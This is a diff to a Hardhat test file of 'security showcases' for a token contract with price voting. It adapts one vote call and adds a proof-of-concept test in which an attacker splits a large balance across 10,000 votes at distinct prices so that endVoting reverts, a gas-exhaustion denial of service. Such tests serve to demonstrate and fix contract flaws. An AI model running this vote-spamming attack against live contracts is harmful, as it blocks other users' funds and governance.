@@ -57,9 +57,7 @@ describe("Security showcases", function () {
         expect( 
             await token.vote(
                 priceToVote, 
-                tokensVoted, 
-                0,
-                0, 
+                tokensVoted,
                 {
                     value: tip
                 }
@@ -92,6 +90,31 @@ describe("Security showcases", function () {
         expect(finalNet).to.be.gt(tip); //attack is successful if we got more ETH than was supposed
     });
 
+    it('Attacker should be able to dos contract', async function() {
+        this.timeout(300000);
+        await token.buy({
+            value: ONE_ETH*1000n
+        });
 
+        const totalBalance = await token.balanceOf(user1.address);
+
+        await token.startVoting();
+
+        expect(await token.isVotingInProgress()).to.be.true;
+        
+        const dosRounds = 10000n
+        const tokenDosAmount = totalBalance/dosRounds;
+
+        for(let i = 1n; i<=dosRounds; i++){
+            await token.vote(i,tokenDosAmount);
+        }
+
+        const { time } = _networkHelpers;
+        const votingTimeLength: bigint = await token.votingTimeLength();
+        const currentTime: bigint = BigInt(await time.latest());
+        await time.increaseTo(currentTime + votingTimeLength + 1n);
+
+        await expect(token.endVoting()).to.be.revert(_ethers);
+    });
 
 });
